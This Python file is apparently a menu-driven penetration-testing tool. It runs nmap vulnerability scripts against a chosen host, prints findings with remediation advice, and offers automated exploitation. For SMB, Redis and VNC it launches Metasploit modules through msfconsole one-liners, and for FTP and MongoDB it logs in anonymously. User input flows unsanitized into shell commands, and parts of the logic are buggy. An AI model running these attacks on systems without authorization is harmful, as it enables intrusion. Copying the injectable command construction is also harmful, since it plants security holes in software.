import os
import subprocess

# Define color and style codes
RESET = '\033[0m'
BOLD = '\033[1m'
LCYAN = '\033[96m'
RED = '\033[91m'
LPURPLE = '\033[94m'
GREEN = '\033[92m'  # Adding Green color code

# Main function


def main():
    # Your default values
    output_file = "output.txt"

    def handle_option():
        try:
            run_scan_loop = True
            scan_type_selected = False

            while run_scan_loop:
                hosts = "clear"
                os.system(hosts)

                print(f"{LCYAN}{BOLD}"
                      f"                _         __                     \n"
                      f" /\   /\ _   _ | | _ __  / _\ _   _  _ __    ___ \n"
                      f" \ \ / /| | | || || '_ \ \ \ | | | || '_ \ /  __|\n"
                      f"  \ V / | |_| || || | | |_\ \| |_| || | | || (__ \n"
                      f"   \_/   \__,_||_||_| |_|\__/ \__, ||_| |_| \___|\n"
                      f"                              |___/              \n"
                      f"{RESET}")

                if not scan_type_selected:
                    # Ask user for scan type
                    while True:
                        print(f"{BOLD}1. {LCYAN}Fast Scan{RESET} ")
                        print(f"{BOLD}2. {LCYAN}Full Scan{RESET} ")
                        print(f"{BOLD}3. {LCYAN}Top Port Scan{RESET} ")
                        print(f"{BOLD}4. {LCYAN}TCP Scan{RESET} ")
                        print(f"{BOLD}5. {LCYAN}UDP Scan{RESET} ")
                        scan_type = input("\nChoose scan type : ").lower()
                        if scan_type in ['1', '2', '3', '4', '5']:
                            scan_type_selected = True
                            break
                        else:
                            print(
                                "\nInvalid input. Please choose 1, 2, 3, 4 or 5.\n")

                # Check if the output file exists
                if os.path.exists(output_file):
                    print("")
                    print(f"{BOLD}{LCYAN}Open Port:{RESET} ")
                    os.system(f"grep --color syn-ack {output_file}")
                    print("")
                    print(f"{BOLD}{LCYAN}Close Port:{RESET} ")
                    os.system(f"grep --color 'filtered\|closed' {output_file}")
                    print("")
                else:
                    print("")
                    ip = input("Enter the target IP/URL: ")
                    print("")
                    if scan_type == '1':
                        command = f"sudo nmap -sV -sC -T4 -vv -oA fastscan {ip} -oN {output_file}"
                    elif scan_type == '2':
                        command = f"sudo nmap -sV -sC -T4 -vv -oA fullscan {ip} -oN {output_file}"
                    elif scan_type == '3':
                        command = f"sudo nmap -sV -sC -T4 -vv --top-ports 100 {ip} -oN {output_file}"
                    elif scan_type == '4':
                        command = f"sudo nmap -sT -vv -T4 {ip} -oN {output_file}"
                    else:
                        command = f"sudo nmap -sU -vv -T4 {ip} -oN {output_file}"
                    print(f"{GREEN}Starting!!!\n{RESET}")
                    print(f"{LCYAN}On Progress!!! (Please be patient)\n{RESET}")
                    print(
                        "+++=======================================================+++\n")
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")

                    print(f"{BOLD}{LCYAN}Open Port:{RESET} ")
                    os.system(f"grep --color syn-ack {output_file}")
                    print("")
                    print(f"{BOLD}{LCYAN}Close Port:{RESET} ")
                    os.system(f"grep --color 'filtered\|closed' {output_file}")
                    print("")

                ports = input("Enter the ports to scan (e.g., 22): ")

                # Main
                if "22" in ports.split(','):
                    command = f"sudo nmap -p22 -sC -Pn -sV --script ssh2-enum-algos --script ssh-auth-methods {ip} -oN result.txt"
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    check_and_display_vulnerabilities("result.txt")

                elif "21" in ports.split(','):

                    command = f"sudo nmap -sV -p21 -sC -A -Pn --script=ftp-anon {ip} -oN result.txt"
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities(
                        "result.txt")

                    # Prompt the user for exploitation after displaying all vulnerabilities
                    print("")
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':

                            metasploit_command = f"ftp anonymous@{ip}"
                            print("")
                            print(f"{LCYAN}Notes: {RESET}")
                            print(f"{LCYAN}Insert Password: {RESET}anonymous")
                            print(f"{LCYAN}List Directory: {RESET}ls -a")
                            print(f"{LCYAN}Exit: {RESET}bye")
                            print(f"")
                            os.system(metasploit_command)

                            print("")
                            print("")
                            print(
                                f"{RED}Vulnerability {RESET}Anonymous FTP login allowed = {GREEN}VALID {RESET}")

                            print("")
                            print(f"{LCYAN}Thanks For Using This Tool! {RESET}")

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print(
                            "No vulnerabilities found with minimum or low severity.")

                elif "23" in ports.split(','):
                    command = f"sudo nmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 {ip} -oN result.txt"
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    check_and_display_vulnerabilities("result.txt")

                elif "25" in ports.split(','):
                    command = f"sudo nmap -Pn -sV --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25,465,587 {ip} -oN result.txt"
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    check_and_display_vulnerabilities("result.txt")

                elif "80" in ports.split(',') or "443" in ports.split(','):
                    command = f"sudo nmap -T4 --reason -Pn -sV -p 80,443 --script='banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)' {ip} -oN result.txt"
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    check_and_display_vulnerabilities("result.txt")

                elif "139" in ports.split(',') or "445" in ports.split(','):
                    command = f"sudo nmap -p 139,445 -vv -Pn --script smb-security-mode.nse --script smb2-security-mode --script smb-vuln* --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {ip} -oN result.txt -vv"
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities(
                        "result.txt")

                    # Prompt the user for exploitation after displaying all vulnerabilities
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':

                            print("")
                            selected_vulnerability = input(
                                "Which Vulnerability You Need to Exploit? ")
                            ip = input("IP/URL Target? ")
                            selected_lhost = input(
                                "IP/URL Your Device/VPN (Default en0)? ").lower()

                            print("")

                            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 445; set LHOST {selected_lhost}; run; exit'"
                            os.system(metasploit_command)

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print(
                            "No vulnerabilities found with minimum or low severity.")

                elif "6379" in ports.split(','):
                    command = f"sudo nmap -p 6379 --script redis-info {ip} -oN result.txt -vv"
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities(
                        "result.txt")

                    # Prompt the user for exploitation after displaying all vulnerabilities
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':

                            print("")
                            selected_vulnerability = input(
                                "Which Vulnerability You Need to Exploit? ")
                            ip = input("IP/URL Target? ")
                            selected_lhost = input(
                                "IP/URL Your Device/VPN (Default en0)? ").lower()

                            print("")

                            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 6379; set LHOST {selected_lhost}; run; exit'"
                            os.system(metasploit_command)

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print(
                            "No vulnerabilities found with minimum or low severity.")

                elif "5800" in ports.split(',') or "5801" in ports.split(',') or "5900" in ports.split(',') or "5901" in ports.split(','):
                    command = f"sudo nmap -p 5800,5801,5900,5901 -Pn --script vnc-info,realvnc-auth-bypass,vnc-title {ip} -oN result.txt -vv"
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities(
                        "result.txt")

                    # Prompt the user for exploitation after displaying all vulnerabilities
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':

                            print("")
                            selected_vulnerability = input(
                                "Which Vulnerability You Need to Exploit? ")
                            ip = input("IP/URL Target? ")
                            selected_lhost = input(
                                "IP/URL Your Device/VPN (Default en0)? ").lower()

                            print("")

                            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 5900; set LHOST {selected_lhost}; run; exit'"
                            os.system(metasploit_command)

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print(
                            "No vulnerabilities found with minimum or low severity.")

                elif "27017" in ports.split(',' or "27018" in ports.split(',')):

                    command = f"sudo nmap -sV -p 27018,27017 -sC -A -Pn --script= mongodb-info {ip} -oN result.txt"
                    try:
                        with open(os.devnull, 'w') as nullfile:
                            subprocess.check_call(command, shell=True,
                                                  stdout=nullfile, stderr=nullfile)
                    except subprocess.CalledProcessError:
                        print("Error occurred while running the Nmap scan.")
                        print("")
                    vulnerabilities_found = check_and_display_vulnerabilities(
                        "result.txt")

                    # Prompt the user for exploitation after displaying all vulnerabilities
                    print("")
                    if vulnerabilities_found:
                        exploit_choice = input(
                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()

                        # Check user's choice and call the function accordingly
                        if exploit_choice == 'yes':

                            metasploit_command = f"mongo {ip}"
                            print("")
                            print(f"{LCYAN}MongoDB Commnads: {RESET}")
                            print(f"{LCYAN}show dbs {RESET}")
                            print(f"{LCYAN}use <db>{RESET}")
                            print(f"{LCYAN}show collections{RESET}")
                            print(f"{LCYAN}db.<collection>.find(){RESET}")
                            print(f"{LCYAN}db.<collection>.count(){RESET}")
                            print(f"")
                            os.system(metasploit_command)

                            print("")
                            print("")
                            print(
                                f"{RED}Vulnerability {RESET}Anonymous FTP login allowed = {GREEN}VALID {RESET}")

                            print("")
                            print(f"{LCYAN}Thanks For Using This Tool! {RESET}")

                        elif exploit_choice == 'no':
                            print("Not exploiting any vulnerabilities.")
                        else:
                            print("Invalid choice. Please enter 'yes' or 'no'.")
                    else:
                        print(
                            "No vulnerabilities found with minimum or low severity.")

                # Another Step
                retry_option = input(
                    "Do you want to scan another port (y) or exit the program (exit): ").lower()
                if retry_option == 'exit':
                    run_scan_loop = False
            # If User Exit
            if os.path.exists(output_file):
                os.remove(output_file)
        # If User Keyboard Interrupt
        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...")
            if os.path.exists(output_file):
                os.remove(output_file)

    def check_and_display_vulnerabilities(filename):
        vulnerabilities_found = False

        def check_and_display_vulnerability(vulnerability_name, grep_pattern, severity, description, recommendation):
            nonlocal vulnerabilities_found
            hosts = f"grep -q -oh '{grep_pattern}' {filename}"
            if os.system(hosts) == 0:
                vulnerabilities_found = True
                print("")
                print(f"{RED}Vulnerability{RESET}: {vulnerability_name}")
                print(f"{RED}Severity{RESET}: {severity}")
                print(f"{RED}Impact{RESET}: {description}")
                print("")
                print(f"{LPURPLE}Recommendation{RESET}: {recommendation}")
                print("")
                print("+++=======================================================+++")
                print("")

        check_and_display_vulnerability(
            "SSH Authentication Methods Enumeration",
            "ssh-auth-methods",
            "Informational",
            "\nSecurity Risk: Enumerating SSH authentication methods can reveal potentially insecure methods, which could be targeted by attackers.",
            "\nDisable Weak Methods: Disable deprecated and weak authentication methods (e.g., password-based authentication and publickey-based authentication) in favor of more secure methods such as public key-based authentication.",
        )

        check_and_display_vulnerability(
            "Weak SSH Enumeration Algorithms",
            "3des-cbc\|arcfour\|rc4",
            "Informational",
            "\nSecurity Risk: The use of weak SSH enumeration algorithms such as 3des-cbc, arcfour, and rc4 poses a significant security risk. These algorithms have known vulnerabilities and weaknesses that can be exploited by attackers to compromise the confidentiality and integrity of SSH communications.",
            "\nUpdate SSH Configuration: It is strongly recommended to update the SSH server configuration to disallow the use of weak encryption algorithms, including 3des-cbc, arcfour, and rc4."
        )

        check_and_display_vulnerability(
            "Insecure SSH Authentication Methods",
            "publickey\|password",
            "Informational",
            "\nDiscovered that the SSH server supports both the 'publickey' and 'password' authentication methods, potentially exposing the system to security risks.",
            "\nThis configuration exposes the system to the risk of brute force attacks, where attackers may attempt to gain unauthorized access using weak passwords or by exploiting vulnerabilities in the public key authentication process."
        )

        check_and_display_vulnerability(
            "Anonymous FTP login allowed",
            "Anonymous FTP login allowed",
            "Low - High",
            "\nSecurity Risk: Allowing anonymous FTP login can pose a significant security risk. It means that anyone can access and potentially upload or download files from your FTP server without authentication. This could lead to unauthorized access, data breaches, or the uploading of malicious files.",
            "\nDisable Anonymous FTP: The most effective way to mitigate this risk is to disable anonymous FTP login altogether. This can usually be done in your FTP server's configuration. By doing so, you ensure that only authorized users can access the FTP server."
        )

        check_and_display_vulnerability(
            "Telnet Server Without Encryption Support",
            "Telnet server does not support encryption",
            "Informational",
            "\nSecurity Risk: Telnet is inherently insecure as it transmits data, including login credentials, in plain text. Without encryption support, sensitive information is vulnerable to eavesdropping by malicious actors.",
            "\nImplement Secure Alternatives: Replace Telnet with more secure alternatives such as SSH (Secure Shell), which encrypts communication and provides stronger security. |\n | Disable Telnet: If possible, disable the Telnet service on the server to eliminate the security risk associated with plaintext communication."
        )

        check_and_display_vulnerability(
            "HSTS not configured in HTTPS Server",
            "HSTS not configured in HTTPS Server",
            "Informational",
            "\nImproved Security: Enabling HSTS significantly enhances the security of your website by ensuring that all communications are encrypted using HTTPS. It mitigates risks associated with SSL-stripping attacks and prevents downgrade attacks.",
            "\nConfigure your web server to send the HSTS header in the HTTP response.\n| Strict-Transport-Security: max-age=31536000; includeSubDomains"
        )

        check_and_display_vulnerability(
            "Potentially risky methods: TRACE or DELETE",
            "TRACE\|DELETE",
            "Informational",
            "\nImproved Security: The primary impact of fixing this issue is improved security. Disabling TRACE and implementing other security measures can help protect your web application from certain types of attacks and vulnerabilities.",
            "\nDisable TRACE Method: The most effective way to fix this issue is to disable the TRACE method altogether on your web server. This can usually be done in the web server configuration."
        )

        check_and_display_vulnerability(
            "64-bit block cipher 3DES vulnerable to SWEET32 attack",
            "64-bit block cipher 3DES vulnerable to SWEET32 attack",
            "Informational",
            "\nSecurity Improvement: Replacing 3DES with a more secure cipher, like AES, will significantly enhance the security of your data transmissions. It will protect against SWEET32 attacks, which exploit vulnerabilities in ciphers with 64-bit block sizes.",
            "\nReplace 3DES: Replace the 3DES (Triple Data Encryption Standard) cipher with a more secure alternative, such as AES (Advanced Encryption Standard). AES is widely considered to be secure and is not vulnerable to SWEET32 attacks."
        )

        check_and_display_vulnerability(
            "Broken cipher RC4 is deprecated by RFC 7465",
            "Broken cipher RC4 is deprecated by RFC 7465",
            "Informational",
            "\nSecurity Enhancement: Disabling RC4 is essential as it is known to have serious security weaknesses. By deprecating RC4, you prevent vulnerabilities like the BEAST attack and other cryptographic attacks.",
            "\nDisable RC4: Immediately disable the RC4 cipher suite in your SSL/TLS configurations. This should be done both on the server and client sides."
        )

        check_and_display_vulnerability(
            "TLSv1.0 or TLSv1.1 Enabled",
            "TLSv1.0\|TLSv1.1",
            "Informational",
            "\nSecurity Risk: TLSv1.0 and TLSv1.1 have known vulnerabilities that can be exploited by attackers to intercept and manipulate encrypted data. This poses a significant security risk to your system.",
            "\nUpgrade to TLSv1.2 or TLSv1.3: Upgrade your servers and applications to support TLSv1.2 or TLSv1.3. These versions are more secure and offer better protection against attacks.\n| Disable TLSv1.0 and TLSv1.1: Disable TLSv1.0 and TLSv1.1 on your servers and applications. Ensure that they are not used as negotiation options during the TLS handshake."
        )

        check_and_display_vulnerability(
            "Insecure Message Signing Configuration",
            "disabled",
            "Informational",
            "\nMessage signing is disabled, which is a dangerous default configuration. Without proper message signing, the application is vulnerable to data tampering and injection attacks, potentially leading to unauthorized access, data manipulation, or other security breaches.",
            "\nEnable Message Signing: Configure the application to use strong message signing mechanisms, such as HMAC (Hash-based Message Authentication Code) or digital signatures, to ensure the integrity and authenticity of transmitted data."
        )

        check_and_display_vulnerability(
            "SMB remote memory corruption vulnerability",
            "corruption",
            "High",
            "\nSuccessful exploitation of this vulnerability could allow an attacker to remotely corrupt memory in the SMB (Server Message Block) protocol implementation, leading to potential unauthorized access, data leakage, or denial of service.",
            "\nApply Security Updates: Regularly update and patch the affected systems to ensure that the SMB protocol implementation is up-to-date with the latest security fixes."
        )

        check_and_display_vulnerability(
            "Print Spooler Service Impersonation Vulnerability",
            "Impersonation",
            "High",
            "\nThis vulnerability could result in an attacker executing arbitrary code with the privileges of the Print Spooler service, which might lead to unauthorized access, data manipulation, or further exploitation of the host system.",
            "\nApply Security Updates: Ensure the Print Spooler service and the underlying operating system are up-to-date with the latest security patches."
        )

        check_and_display_vulnerability(
            "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
            "Remote\|Code\|Execution",
            "High - Critical",
            "\nThis finding indicates a critical vulnerability that allows an attacker to execute arbitrary code remotely on Microsoft SMBv1 servers. Exploiting this vulnerability can lead to unauthorized access, data theft, and potential compromise of the entire system.",
            "\nApply Security Updates: Immediately apply the relevant security patch (MS17-010) provided by Microsoft to address this vulnerability.\nDisable SMBv1: Consider disabling the outdated SMBv1 protocol if it's not required for specific applications."
        )

        check_and_display_vulnerability(
            "Unprotected Redis Server",
            "Role",
            "High",
            "\nThe lack of password authentication on the Redis server poses a significant security risk. Attackers could potentially gain unauthorized access to sensitive data stored in the Redis database, manipulate data, or perform denial-of-service attacks, depending on the configuration and use case of the Redis server.",
            "\nEnable the 'requirepass' directive in the redis.conf configuration file."
        )

        check_and_display_vulnerability(
            "Insecure VNC Configuration (VNC NONE AUTH)",
            "does\|not\|require\|authentication",
            "High",
            "\nThe presence of VNC with the 'VNC_NONE_AUTH' authentication method indicates a serious security misconfiguration. Attackers could exploit this misconfiguration to gain unauthorized access to the system, potentially compromising sensitive data or performing malicious activities.",
            "\nDisable VNC or configure it to use secure authentication methods such as VNC password or SSH tunneling."
        )

        check_and_display_vulnerability(
            "MongoDB Database Found Without Authentication",
            "sizeOnDisk",
            "Critical",
            "\nThis finding indicates a severe security misconfiguration where the MongoDB database is accessible without requiring authentication. It exposes sensitive data stored in the database, allowing unauthorized access, modification, or deletion of data.",
            "\nEnable authentication mechanisms such as username/password or keyfile authentication in the MongoDB configuration."
        )

        return vulnerabilities_found  # Return whether vulnerabilities were found

    handle_option()


# Run the main function if this script is executed
if __name__ == "__main__":
    main()
